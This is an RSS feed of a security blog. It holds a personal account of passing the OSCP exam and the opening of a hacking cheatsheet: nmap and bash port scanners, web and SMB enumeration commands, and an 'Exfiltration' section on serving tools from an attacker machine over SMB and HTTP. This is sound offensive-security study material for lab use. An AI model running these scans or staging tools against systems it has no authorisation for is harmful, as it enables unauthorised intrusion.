<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Ceso Adventures</title>
        <link>https://ceso.github.io/posts/</link>
        <description>Recent content in Posts on Ceso Adventures</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Mon, 27 Apr 2020 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://ceso.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>A Journey in the Dark - An adventure&#39;s tale towards OSCP</title>
            <link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link>
            <pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid>
            <description>Preface This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.
Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</description>
            <content type="html"><![CDATA[
    <img src="/images/blog/oscp/oscp_banner.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="preface">Preface</h2>
<p>This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.</p>
<p>Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</p>
<p>This story is no less , then than anything thanks to my buddies <a href="https://www.hackthebox.eu/home/users/profile/186934">r0xas</a>, <a href="https://www.hackthebox.eu/home/users/profile/12286">MrBulldops</a>, <a href="https://twitter.com/tagnullde">0x41</a> and <a href="https://www.hackthebox.eu/home/users/profile/43855">DutchPyro</a>, for helping and still help me in this adventures and the ones that will came.
And most than anything <a href="https://www.linkedin.com/in/mquerves/">Mauri</a> because you just convinced to stop shitting myself, from &ldquo;I can&rsquo;t&rdquo; to &ldquo;I can&rdquo;.</p>
<p><em>By the way, I really really love books (guess why the title of the post!), and I&rsquo;m really happy getting this cert during this C-19 thing (living abroad at this time, is though), so I just wanted to make this post in the way it makes me the happiest.</em></p>
<h2 id="000-the-background">000: The background</h2>
<p>At the ends of 2014 I started my first IT job, specifically as a Linux Sysadmin Junior, almost knowing nothing more than a few really basic concepts, in this place I got to learn a lot of stuff and was where I got to know awesome technicians and people, at this day all of them friends, and ones I consider the closest for me.
From this forward, I kept advancing some seniorities and changed 2 times of job and moving abroad last year, currently working as a DevOps Engineer (tl;dr, it&rsquo;s been 5 years and going to 6), all the time learning new stuff, either at work or by myself, but never without stop learning.</p>
<p>I don&rsquo;t hold any kind of degree most than High School. I started university but I moved abroad so, something I will neither earn in the future, all what I know, is by self-teaching. I&rsquo;m someone who loves to be ALL the time learning new stuff, to understand how stuff works, trying to replicate it, break it, play with it and see what happens, always enjoying the process of learning, either if there is no light and all is an &ldquo;I&rsquo;m stupid/I suck/I can&rsquo;t&rdquo; or that amazing moment when something clicks in and you turn into the most happiest person just because you learned something new regardless if it was something stupid or not.</p>
<h2 id="001-my-preparation">001: My preparation</h2>
<p>I always felt attracted to security but never felt confident to actually start learning about it, until November of last year that Mauri just made me make my mind. From this I started playing a bit in Hack The Box, all the time using hints, watching <a href="https://ippsec.rocks/">Ippsec videos</a> or learning new stuff by reading machine write-ups by <a href="0xrick.github.io/">0xrick</a> and by <a href="0xdf.gitlab.io/">0xdf</a>.
I did (in this order): Postman, Traverxec, Lame, Bitlab, Bashed, Obscurity, Mango, AI and Craft (first one without hints), tried to do OpenAdmin but was unable to get the second user without hints, I decided I did not want to read more hints, so just put it for later.</p>
<p>I got 90 days and my lab time started the 5th of January, my way of approaching it was:</p>
<ul>
<li>I spent the first 2 weeks just going through the PDF and the Videos.</li>
<li>Once I was done with this I started to the labs, but a few days after some personal problems arose and I was so stressed that I couldn&rsquo;t focus at nothing, so for around 1 - 2 weeks I stopped touching the labs (that I barely touched) or anything OSCP related.</li>
<li>Storm ended, I started to play a bit everyday after work on the labs, this was around 1 - 2 hs per day, and on weekends tried to sessions of 8 - 12 hours.</li>
<li>OSCP announced their upgrade to the new labs, being I still had time left (even going through some shit), and keeping in mind the amount of new material (from 300-ish pages on the PDF to 800-ish, and from 7-ish hs of videos to 18-ish hs of videos) I just decided it was worth to do the upgrade, so I did it.</li>
<li>I got the new material and VPN, and started to play in the new labs, but at this time using the material more as reference on certain specific topics (example: Microsoft Office explotaition), this still being complemented with Ippsec + 0xrick and 0xdf write-ups.</li>
</ul>
<h2 id="010-my-lab-experience">010: My lab experience</h2>
<p>As mentioned, of the 90 days I used way less than those for doing the labs, now before starting to play with them, I set some goals that I needed to achieve before the lab time ended, these goals were:</p>
<ul>
<li>Compromise in total at least 42 machines.</li>
<li>Gain access to all the extra nets.</li>
<li>Root on no less than 3 hosts per extra net.</li>
<li>Completly root an extra net.</li>
</ul>
<p>I achieved all those goals, of the 42 machines I got 46 (of a total 75), got access to the 3 extra nets, compromised more than 3 hosts per net and fully rooted one; Dev 5 hosts, IT 4 hosts and Admin fully rooted.</p>
<p>Personally for me, the labs are similar and at the same time different to Hack The Box, why? Because the labs are sort of like &ldquo;real&rdquo; basic nets, in the sense that there is a dependence between some hosts, you can&rsquo;t get one without first compromising another or even get to enumerate/discover other hosts, without first compromising N firewalls, the fact that there is nothing written, that you need to discover which host has dependence with which host, for me was really fun. Also in this aspect, it really helped having experience as sysadmin maintaining large amounts of servers across multiple networks, because in scale PWK nets were really small ones and without normal components you find in a real network, again basic &ldquo;real&rdquo; nets.</p>
<p>On the other hand, the OSCP Exam itself, yes it is really HTB-like, you are given N machines, every machine having specific points, there are no dependencies, there is no looting needed, the only thing that is needed is to break independent machines, tl;dr: enumerate, enumerate, enumerate&hellip;enumerate, try, try harder, keep trying, repeat.</p>
<p><strong>Now, one important point about PWK/OSCP vs HTB, with PWK/OSCP you pretty much 99% of the time will find a CVE (or just a public POC on exploit-db) for what you are trying to break, while HTB tends to be more misconfigurations and/or CTF stuff, this makes a lot of stuff on HTB harder than PWK/OSCP</strong></p>
<h2 id="011-20200411---the-mock-exam">011: 20200411 - The Mock Exam</h2>
<p>During the whole PWK, my biggest worry, was not breaking machines itself, no, it was two things:</p>
<ul>
<li>The report</li>
<li>The proctored exam</li>
</ul>
<p>This was going to be the first time in my life needing to write down a report of something like an exam in english (english, is not my native language, and as I&rsquo;m self-teaching I lack a lot of stuff), so this was enough to put me in some sort of panic state, it was going to be so, so, so easy to fuck it up, I mean, I&rsquo;m sure while you are reading this, a lot of stuff had made your eyes cry because something is WRONG, so just imagine how much worried I was in this aspect!!</p>
<p>And the second, the proctored exam, I&rsquo;m good at working under pressure (I worked under strict SLAs), but doing something with a deadline of 24 hs as OSCP is, while <em>being watched</em> that whole time? Personally for me, that was just a totally new thing, and one that made me to creep <em>A LOT</em>.</p>
<p>To deal with those things, I thought about doing a Mock Exam (ONE week before the real one), what do I mean with a mock exam? Basically I was going to pick up 5 random machines from <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">HTB/Vulnhub OSCP-alike</a>, and starting at a similar time as the one of my OSCP, hack them in a time frame of 23 hs 45 minutes, if I run out of time and I was not able to do it, then I was not able to do it, no way around it, on top of this to get used to the proctoring I was going to do a live stream on youtube for the whole time I needed to get the machines or until running out of time, whichever happend first.
For the report itself, I gave me more freedom with it, the aim yes, was to do something similar to what I should submit to Offensive Security, but as this was a completely new thing, and more easy for me to fuck up, I thought of it more as a learning experience, so no, no deadlines to do it. I&rsquo;m really grateful of doing it, because I ended indeed learning quite a lot about the process of what is worth to document, what is not, what I should I avoid, what notes <em>I MUST</em> always have to write down, etc.</p>
<h4 id="00---the-live-streaming">00 - The Live Streaming</h4>
<p>Days before the exam I asked to be chosen random machines from the list of alike-ones (link above in HTB/Vulnhub alike) and assign points to them, the list ended like this:</p>
<ul>
<li>Brainpan - 25 pts - BOF</li>
<li>Bart - 25 pts</li>
<li>Lightweight - 20 pts</li>
<li>Arctic - 20 pts</li>
<li>Optimum - 10 pts</li>
</ul>
<p>Finally, the 2020/04/11 I started doing a livestream on youtube, and ended rooting all the machines in around 14 hs. <strong>Worth to mention I cut the live stream at around those 14 hs, but youtube only uploaded 12 hs of video, this also was the first time I was streaming something and I didn&rsquo;t know OBS by default didn&rsquo;t do a recording of the videos while streaming, so I don&rsquo;t have the original video to upload the 2 hs missing, but if wanted I just can record that missing parts</strong>, said that, the streaming:</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/FwZc6JigIcE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h4 id="01---note-taking">01 - Note Taking</h4>
<p>When I started my notes were pure shit, I&rsquo;m sure they still are, but are way better than what they were before. For taking/keeping notes through all the PWK and OSCP, I used Cherrytree, I started with <a href="https://411hall.github.io/assets/files/CTF_template.ctb">this template</a>, but as I moved forward and my own methodology started to develop I modified some stuff, the result was having this template:</p>
<pre><code class="language-console" data-lang="console">https://ceso.github.io/static/files/oscp/template_pwk.ctb
</code></pre><p><strong>Note:</strong> Something I didn&rsquo;t know during the exam, is that in the past some pepole has lost their notes of Cherrytree because the files got corrupted, then they were unable to  prepare their reports, my advice then is, maybe start with Cherrytree, and as time moves on, switch to some another tool for notetaking, such as <a href="https://joplinapp.org/">joplin</a> or <a href="https://notion.so/">Notion</a> to mention two examples, you will already have some methodology developed or starting to, so it will be easier to create a template adapted to yourself.</p>
<h4 id="10---the-report">10 - The Report</h4>
<p>Now, for the report I decided to ditch the doc/.odf templates and just go with something I&rsquo;m more comfortable: Markdown.
For that I ended using the <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">template created by noraj</a>, which using Eisvogel and LaTeX, the markdown is converted to .pdf.
Keep in mind that this has some <em>HEAVY</em> requirements when it comes to packages, you need to install around 5 GB and I was too lazy to be honest for figuring out exactly which what packages were needed.
In summary you need to install <a href="https://pandoc.org/installing.html">pandoc</a>, <a href="https://github.com/Wandmalfarbe/pandoc-latex-template#required-latex-packages">LaTeX</a> and the <a href="https://github.com/Wandmalfarbe/pandoc-latex-template/blob/master/eisvogel.tex">Eisvogel template</a>. Having that done is just a matter of edition with your favourite text editor, I used VS Code.
If you want to read a bit more in deep about this, I recommend you to read <a href="https://www.tagnull.de/post/oscp-reporting/">this post by 0x41</a>, or watch the following video by John Hammond talking about this subject:</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/MQGozZzHUwQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<p>This is the PDF report of the simulation done at the Live Streaming on Youtube:</p>
<pre><code class="language-console" data-lang="console">https://ceso.github.io/static/files/oscp/OSCP-OS-42-Simulation-Report.pdf
</code></pre><p>And this, is the markdown code to generate the PDF above:</p>
<pre><code class="language-console" data-lang="console">https://ceso.github.io/static/files/oscp/OSCP-OS-42-Simulation-Report.md)
</code></pre><h2 id="100-20200418---the-big-day">100: 20200418 - The Big Day</h2>
<p>After the simulation, the big day of the exam just arrived, 2020/04/18 at 15 hs started my exam. I didn&rsquo;t do any kind of weird preparation for it, more than keeping a Cherrytree template with the 5 machines ready before the exam (using the one I posted above hosted on this blog), set a sharing folder between my host machine and kali (for not in the world, I wanted something crashing and end up losing everything just because I write only inside the VM), kept ready the templates on markdown for the report of the exam, and a FULL NIGHT OF SLEEP the day before (which I asked as day-off).</p>
<p>Describing now my exam, it went as follows:</p>
<p>I left running in parallel 4 Full NMaps against all the machines except for the one of the BOF and the Development one for it.
Afterwards I proceeded to start with the BOF really confident about it while the nmaps run, I got confused counting badchars because there were A LOT of them, and ended spending quite some time on this&hellip;took me more than what it should. Once I was finished with the BOF, I jumped straight into reading the results of the nmaps.</p>
<p>Five hours after starting the exam, I was feeling really blue, I didn&rsquo;t got anything else than the BOF, was enumerating the two 20 points, in one I found a public exploit but no matter what I was trying, I couldn&rsquo;t make it to work, and the other one, I was extremely in a tunnel vision because I was not able to bypass a filter, this last thing I tried for over 3 hs I think or even more, I was feeling really really bad. The hours keep going and still, only BOF, only 25 pts, more than 5/7 hs used, and still nothing else, I stopped to have some dinner and try to cool down, once I came back I kept aside the the one for bypassing the filter and BANG ended in a post of 0xdf where he referenced an alternative exploit for the software I was trying to exploit in the 20 pts machine, and&hellip;foothold! it worked at first, I was still feeling pretty bad, I was going to lose&hellip;
I returned to the one with the bypass and, suddenly I realized what I was trying was a rabbit-hole, and literally the first thing I tried hours before was the way to go, I only didn&rsquo;t notice it worked at that time, awesome! in less than 1 hour or 2 I got user on the two 20 machines, the landscape started to be nice a gain. One or two hours later, I was submitting the proof of root of one of those 20 pts machine, now I had under my score 45 pts, with 25 more I was going to be able to pass&hellip;BUT nothing is always so nice&hellip;I ended spending ALL the night trying to get root in the remaining 20 pts machine, when I realized outside was already daylight again, it was around 7 am, my mental strenght was like shit, my mood was extremly blue, I was convinced I was going to fail the exam, only thing I wanted was to sleep, was to give up, and even maybe not taking a 2nd attempt again, the mix between feling sososo tired plus feeling so stupid because the performance I was having while on the simulation it went that good, it was raping me, I gave up and stopped to take a nap of around 1 h or 1 and half, once I woke up I came back to keep trying this root on the remaining 20 pts, no luck, I was destroyed, I was extremly sad, again&hellip;gave up with this machine and thought about tring the 10 pts to at least have something more, around 30 - 40 minutes later, 10 points more to the score, ok great it&rsquo;s 55 pts, is still NOT enough to pass the exam, I guess I will just try to get at least until user on the 25 pts, to have a bit more of confident with myself&hellip;&ldquo;I tried, I tried&rdquo;, 2 hours later I had submitted the proof of the 25 machine, my mood literally changed, I was &ldquo;re-charged&rdquo; again, I had 80 pts, now I was sure I was able to pass, I couldn&rsquo;t belive it, restarted the machine and did this step once more to confirm it and YES, I indeed rooted it, I was now in the other side, but now with this re-charged mood, having enough points, I decided to keep fighting until the end, to try until the very end of the exam to see if I was able to root the remaining 20 pts machine, found quite a lot of stuff, nothing though that gave me the privilege escalation I needed.
I decided was the time to have some refresh, stopped this and just started to re-do all the prior machines, to be sure the vectors were totally correct and 100% reproducible, that I had all the documentation about them that I needed, AND that I have had submitted the flags correctly, I&rsquo;m extremely glad I did this last thing, because I noticed I submitted the root proof of the 20 machines I rooted, in the one that no.
Once ended with this, I came back to the game trying the root on the remaining 20 pts&hellip;hours later the exam had ended.</p>
<p>I took a nap of around 1 hour, and I had some lunch, from this I started to work on my report, when I realized I had it finished at 4 am, I reviewed it around 4 or 5 times, and went to sleep. Next day I did some more reviews and finally submitted it around 10 am, so between the 18 and 20, I only slept around 5/6 hs with luck.</p>
<p>Through all the exam, I took a lot of short rests of sometimes 10 minutes, sometimes 30 minutes, at some moments every 2 hours at others every 3 hours, you will notice when you need to take a break, just make sure you take them, don&rsquo;t let your self fall into the tempting of not doing it, thinking it will save you time, a break is important as keep pushing.</p>
<p>Talking a bit on the official chat of HTB, I was told that all the community thinks that when you get half-user, that&rsquo;s half the points, so I ended with the thought I got 90 pts, as the remaining 20 pts, I got the user, but not the root (even if I wasn&rsquo;t able to do PE, in my report I included all my findings and personal thoughts about it).</p>
<pre><code class="language-console" data-lang="console">ONCE certificate arrives, photo will behere
</code></pre><h2 id="101-cheatsheet">101: Cheatsheet</h2>
<p>Something that I found really helpful during the exam, is the <a href="https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/">cheatsheet</a> I made along the course as also all the different resources I normally tend to go looking for some references stuff (for example PayloadAllTheThings), you can find a direct link to my Cheatsheet always in the upper right corner of the blog.</p>
<p>Take cheatsheets from other people, start figuring out what stuff is the one you use the more, what&rsquo;s helpfull, what is granted you will not remember, try to develop your own as you progress to the labs, it is really helpfull and also helps to &ldquo;solidify&rdquo; more the stuff in your mind.</p>
<h2 id="110-a-look-into-the-future">110: A look into the future</h2>
<p>Yesterday 2020/04/26 I woke up having a message from Off Sec saying I passed, such good way to wake up, passing OSCP at my first attempt during one of the most shitty moments I have ever lived :).
Now from here, my plans are keep learning more and more as I can about Infosec, my next goal is to learn some basics of Binary Analysis/Reverse Engineering as also learn more in deep about Active Directory attacks as attacks to Clouds (either AWS/Azure/GCP), whichever it is, there is going to be a huge puzzle ahead, a neverending learning, and is there anything better than that? I don&rsquo;t really think so&hellip;</p>
<p>Thanks for reading until the end in case you were able to, and again as said at the beginning I really didn&rsquo;t want to do a &ldquo;normal post&rdquo;, but more something of my own reflecting how do I feel and stuff I love to do. The name of the title is a reference to the chapter of a book, one I really like, and also I felt it goes well with this new world I&rsquo;m trying to move, one where everything tends to be &ldquo;dark&rdquo; either from the impact it has on media (where terms are wrong used), and also I see it as a synonym of &ldquo;deep&rdquo;, being there are some concepts that you need to &ldquo;dig deep&rdquo; to where is &ldquo;dark&rdquo; for stuff to click.</p>
<h3 id="111-one-last-tip">111: One last tip</h3>
<p>Keep Trying, but keep trying harder, when you think there is no light and no hope, just don&rsquo;t give up, a lot of stuff can change in a few hours (I know it myself :P).
Don&rsquo;t think of &ldquo;Try Harder&rdquo; as you need to exprime more your brain, but as don&rsquo;t giving up and giving all you have until the very last second if is needed, of course trying to not get burn out and keeping in mind you are doing it for fun, because you enjoy it.
Take rests, eat, be aware what you are lacking on your documentation and what is excessing, learn to be self-aware of your weakness (mind SQLI and Windows).</p>
<p><strong>But again most important: Keep trying harder!!</strong></p>
<p><strong>Note: Please let me know any fix needed on the text or whatever, it also helps to keep improving my english :P</strong></p>
]]></content>
        </item>
        
        <item>
            <title>Hacking/OSCP cheatsheet</title>
            <link>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</link>
            <pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</guid>
            <description>Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</description>
            <content type="html"><![CDATA[<h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</h1>
<p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
But this is basically the tools I tend to relie and use in this way the most.
Hope is helpfull for you!</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="network-discoverie">Network discoverie</h3>
<h4 id="nmap">Nmap</h4>
<p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p>
<pre><code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;

--top-ports only scan the N most common ports
--open only show open ports
-sC use the default scripts
-sV detect versions
-O detect Operating Systems
-p- scan all the ports
-oA save the output in normal format, grepable and xml
-sU scan UDP ports
</code></pre><p>Is also possible to specify scripts or ports:</p>
<pre><code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
</code></pre><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p>
<pre><code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
</code></pre><h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)</h3>
<h4 id="nc--bash">nc + bash</h4>
<p>If you get in a machine that doesn&rsquo;t has nmap installed, you can do a basic discovery of (for example), top 20 ports open in 192.168.30 by doing:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is closed or filtered</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
</code></pre></div><h4 id="devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
<p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Port </span>$i<span style="color:#e6db74"> is closed</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
</code></pre></div><p>Taking these last  examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>subnet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.30&#34;</span>
top10<span style="color:#f92672">=</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>
<span style="color:#66d9ef">for</span> host in range <span style="color:#f92672">{</span>1..255<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">for</span> port in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
        <span style="color:#f92672">(</span>echo &gt; /dev/tcp/<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp; <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> open</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> closed</span><span style="color:#e6db74">&#34;</span>
    <span style="color:#66d9ef">done</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><h3 id="banner-grabbing-without-nmap">Banner grabbing (without nmap)</h3>
<p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p>
<h4 id="devtcpipport-or-devudpipport-1">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
<pre><code class="language-console" data-lang="console">cat &lt; /dev/tcp/192.168.30.253/22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
</code></pre><p>For doing it with udp ports is the same, but changing tcp for udp</p>
<h4 id="telnet">telnet</h4>
<pre><code class="language-console" data-lang="console">telnet 192.168.30.253 22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
</code></pre><h3 id="web-directoriefile-scanner">Web directorie/file scanner</h3>
<h4 id="gobuster">Gobuster</h4>
<p>Scan all the directories/files by extension:</p>
<pre><code class="language-console" data-lang="console">gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
</code></pre><p>For scanning without extensions, just take out the -x</p>
<h4 id="nikto">Nikto</h4>
<p>Sometimes Nikto shows juicy information, I tend to run it like:</p>
<pre><code class="language-console" data-lang="console">nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
</code></pre><h4 id="fuff">fuff</h4>
<p>Web fuzzer, <a href="https://github.com/ffuf/ffuf">you can get fuff here</a>, it basically bruteforces the dirs.</p>
<pre><code class="language-console" data-lang="console">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
</code></pre><h3 id="samba">Samba</h3>
<h4 id="smbclient">smbclient</h4>
<p>Check if there is anonymous login enabled:</p>
<pre><code class="language-console" data-lang="console">smbclient -L 192.168.24.24
</code></pre><h4 id="impacket">impacket</h4>
<p>Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.</p>
<pre><code class="language-console" data-lang="console">
/usr/share/doc/python3-impacket/examples/smbclient.py &quot;&quot;@192.168.24.24
</code></pre><h4 id="smbmap">smbmap</h4>
<p>Check which permissions we have in those shares (if there are):</p>
<pre><code class="language-console" data-lang="console">smbmap -H 192.168.24.24
Or having an user:
smbmap -u ceso -H 192.168.24.24
</code></pre><h4 id="version-nmap-didnt-detect-it">Version (nmap didn&rsquo;t detect it)</h4>
<p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.</p>

    <img src="/images/cheatsheet/smb-version-wireshark.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="exfiltration">Exfiltration</h2>
<h3 id="samba-1">Samba</h3>
<p>Generate a samba server with Impacket:</p>
<pre><code class="language-console" data-lang="console">impacket-smbserver tools /home/kali/tools
</code></pre><h4 id="mount-in-windows">Mount in Windows</h4>
<p>Mounting it in Windows with Powershell:</p>
<pre><code class="language-console" data-lang="console">New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
</code></pre><p>Mounting it without Powershell:</p>
<pre><code class="language-console" data-lang="console">net use z: \\192.168.42.42\tools&quot;
</code></pre><p>On windows, to list mounted shares, either Powershell or without it:</p>
<pre><code class="language-console" data-lang="console">Powershell: Get-SMBShare
Without Powershell: net share
</code></pre><h4 id="mount-in-linux">Mount in Linux</h4>
<p>Is needed to have installed cifs-utils, to install it (in debian based):</p>
<pre><code class="language-console" data-lang="console">sudo apt-get install cifs-utils
</code></pre><p>To mount it:</p>
<pre><code class="language-console" data-lang="console">sudo mount -t cifs //192.168.42.42/tools ~/my_share/
</code></pre><p>To list mounted shares:</p>
<pre><code class="language-console" data-lang="console">mount | grep cifs
grep cifs /proc/mount

</code></pre><h3 id="http">HTTP</h3>
<p>From your local attacker machine, create a http server with:</p>
<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
</code></pre><p>It&rsquo;s also possible to specify which path to share, for example:</p>
